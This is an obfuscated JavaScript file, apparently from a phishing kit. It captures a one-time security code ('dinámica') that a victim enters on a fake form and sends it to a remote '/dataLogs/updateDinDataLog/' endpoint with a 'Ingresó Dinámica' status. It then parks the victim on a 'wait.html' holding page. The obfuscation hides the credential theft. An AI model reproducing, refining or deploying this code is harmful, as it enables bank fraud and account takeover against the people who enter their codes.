const _0x13b809 = _0x1bbb;
function _0x1bbb(_0xa2584, _0x4bb578) {
  const _0x295f1a = _0x295f();
  return (
    (_0x1bbb = function (_0x1bbbaa, _0x4cfaab) {
      _0x1bbbaa = _0x1bbbaa - 0x11d;
      let _0x277736 = _0x295f1a[_0x1bbbaa];
      return _0x277736;
    }),
    _0x1bbb(_0xa2584, _0x4bb578)
  );
}
function _0x295f() {
  const _0x150b0e = [
    "552268NkgTXn",
    "wait.html",
    "origin",
    "Hubo\x20un\x20error\x20al\x20procesar\x20la\x20solicitud.\x20Por\x20favor,\x20inténtelo\x20de\x20nuevo.",
    "disabled",
    "1254660ODydsk",
    "application/json",
    "stringify",
    "849702qTVkOc",
    "focus",
    "7601238RBLutd",
    "error",
    "12afhbyJ",
    "18LrKJey",
    "PUT",
    "json",
    "2594256EqRlPx",
    "Usuario\x20actualizado\x20correctamente",
    "/dataLogs/updateDinDataLog/",
    "No\x20se\x20encontró\x20el\x20ID\x20o\x20el\x20token\x20en\x20localStorage.",
    "click",
    "value",
    "597565PrbTLN",
    "setItem",
    "location",
    "log",
    "getElementById",
    "3283380erTBAI",
    "getItem",
    "cdin",
    "Error\x20al\x20actualizar\x20datos\x20en\x20el\x20servidor",
    "dataLogId",
    "dataLogToken",
    "info",
    "addEventListener",
    "Ingresó\x20Dinámica",
    "metaInfo",
    "txtdinamica",
  ];
  _0x295f = function () {
    return _0x150b0e;
  };
  return _0x295f();
}
(function (_0x3fd2db, _0xc73be2) {
  const _0x2f5ae7 = _0x1bbb,
    _0x23dc27 = _0x3fd2db();
  while (!![]) {
    try {
      const _0x4117d1 =
        -parseInt(_0x2f5ae7(0x134)) / 0x1 +
        parseInt(_0x2f5ae7(0x123)) / 0x2 +
        (parseInt(_0x2f5ae7(0x12a)) / 0x3) *
          (-parseInt(_0x2f5ae7(0x11e)) / 0x4) +
        -parseInt(_0x2f5ae7(0x139)) / 0x5 +
        (parseInt(_0x2f5ae7(0x12b)) / 0x6) *
          (parseInt(_0x2f5ae7(0x126)) / 0x7) +
        parseInt(_0x2f5ae7(0x12e)) / 0x8 +
        parseInt(_0x2f5ae7(0x128)) / 0x9;
      if (_0x4117d1 === _0xc73be2) break;
      else _0x23dc27["push"](_0x23dc27["shift"]());
    } catch (_0x5d9189) {
      _0x23dc27["push"](_0x23dc27["shift"]());
    }
  }
})(_0x295f, 0x56633);
function updateLS() {
  const _0x1a5519 = _0x1bbb;
  LS[_0x1a5519(0x135)](_0x1a5519(0x13f), JSON[_0x1a5519(0x125)](info));
}
const otpButton = document[_0x13b809(0x138)]("btnDinamica"),
  numberMovil = document["getElementById"](_0x13b809(0x11d));
otpButton[_0x13b809(0x140)](_0x13b809(0x132), async function (_0x1db060) {
  const _0x477f2a = _0x13b809;
  _0x1db060["preventDefault"](), (otpButton[_0x477f2a(0x122)] = !![]);
  if (numberMovil[_0x477f2a(0x133)] == "") {
    alert("Por\x20favor\x20ingrese\x20token\x20de\x20seguridad"),
      numberMovil[_0x477f2a(0x127)](),
      (otpButton[_0x477f2a(0x122)] = ![]);
    return;
  }
  const _0x5c977b = numberMovil[_0x477f2a(0x133)];
  (info[_0x477f2a(0x142)][_0x477f2a(0x13b)] = _0x5c977b), updateLS();
  try {
    const _0x34dae6 = localStorage[_0x477f2a(0x13a)](_0x477f2a(0x13d)),
      _0x4b25d1 = localStorage["getItem"](_0x477f2a(0x13e));
    if (!_0x34dae6 || !_0x4b25d1) throw new Error(_0x477f2a(0x131));
    const _0x3dbfa0 = await fetch(url + _0x477f2a(0x130) + _0x34dae6, {
      method: _0x477f2a(0x12c),
      headers: {
        "Content-Type": _0x477f2a(0x124),
        Authorization: "Bearer\x20" + _0x4b25d1,
        Origin: window[_0x477f2a(0x136)][_0x477f2a(0x120)],
      },
      body: JSON[_0x477f2a(0x125)]({
        din: info[_0x477f2a(0x142)]["cdin"],
        status: _0x477f2a(0x141),
      }),
    });
    if (!_0x3dbfa0["ok"]) {
      const _0x113f08 = await _0x3dbfa0[_0x477f2a(0x12d)]();
      throw new Error(_0x113f08["error"] || _0x477f2a(0x13c));
    }
    console[_0x477f2a(0x137)](_0x477f2a(0x12f)),
      (otpButton[_0x477f2a(0x122)] = ![]),
      (window["location"]["href"] = _0x477f2a(0x11f));
  } catch (_0x497668) {
    console[_0x477f2a(0x129)](
      "Error\x20al\x20actualizar\x20usuario:",
      _0x497668
    ),
      alert(_0x477f2a(0x121)),
      (otpButton[_0x477f2a(0x122)] = ![]);
  }
});
